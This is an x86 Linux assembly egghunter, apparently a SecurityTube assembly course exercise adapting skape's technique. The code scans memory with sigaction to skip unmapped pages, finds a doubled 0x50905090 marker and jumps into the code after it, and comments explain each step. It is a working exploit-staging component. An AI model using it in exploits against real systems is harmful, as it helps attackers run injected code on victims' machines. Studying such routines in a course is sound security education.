; Modified skape code to make it more robust for SecurityTube Linux Assembly Expert course
; Author SLAE - 926 for SecurityTube Linux Assembly Expert course

global _start
 
section .text
_start:

	cld ; clear direction flag
	xor ecx, ecx ; ecx = 00000000
	mul ecx ; eax = 00000000 edx = 00000000
next_page:
	or cx, 0xfff ; PAGE_SIZE
next_byte:
	inc ecx ; next memory offset
	
	push byte +0x43 ; push sigaction syscall on stack
	pop eax ; put sigaction syscall in eax
	int 0x80 ; invoke sigaction syscall 
	
	cmp al,0xf2 ; compare al register and f2 to check for EFAULT violations and set zero flag if violation occured
	jz next_page ; if violation occured jmp to first instruction "or cx,0xfff"
	
	mov eax,0x50905090 ; move egg in little endian format into eax 
	mov edi,ecx ; move offset into edi
	
	scasd ; compare edi with egg in eax
	jnz next_byte ; check if egg is found or jump to "inc ecx"
	scasd ; continue if egg is not found
	jnz next_byte ; check if second egg is found or jump to "inc ecx"
	
	jmp edi ; egg found, execute it in edi
